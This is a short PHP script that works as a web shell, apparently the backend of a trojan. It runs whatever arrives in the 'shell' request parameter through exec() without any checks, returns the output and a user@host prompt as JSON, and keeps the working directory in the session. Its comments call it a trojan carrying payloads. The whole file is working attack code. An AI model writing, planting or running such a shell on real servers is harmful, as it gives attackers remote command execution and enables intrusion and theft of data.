<?php

// @todo: DON'T FORGET TO SEND THE SPECIAL AJAX HEADER HERE
// @todo: probably need to track some kind of options hash over here
// @todo: it would be awesome to build a compatiblity layer for programs like 
// top that don't (I don't think) write to stdout
// @note @todo: all trojans should support some kind of "help" command to show
// you what payloads they're carrying

// use sessions for some conveniences, like preserving the CWD
session_start();

if(isset($_SESSION['cwd'])){
    chdir("{$_SESSION['cwd']}");
}

// assemble the prompt context
$whoami          =  trim(`whoami`);
$cwd             =  getcwd();
$hostname        =  gethostname();
$line_terminator =  ($whoami ===  'root') ? '#' : '$' ;
$prompt_context  =  "{$whoami}@{$hostname}:$cwd{$line_terminator}";

// generate the output
$output = array();

$command = $_REQUEST['shell'] . " 2>&1";
exec($command, $output);
$output = join($output, "\n");

// also need to redirect stderr to stdout
$error = '';
$response = array(
    'prompt_context' => $prompt_context,
    'output'         => $output,
    'error'          => $error,
);

// save the CWD for convenience
// @todo @bug: for some reason, this is borked
$_SESSION['cwd'] = $cwd;

$json = json_encode($response);
echo $json;
    

die();
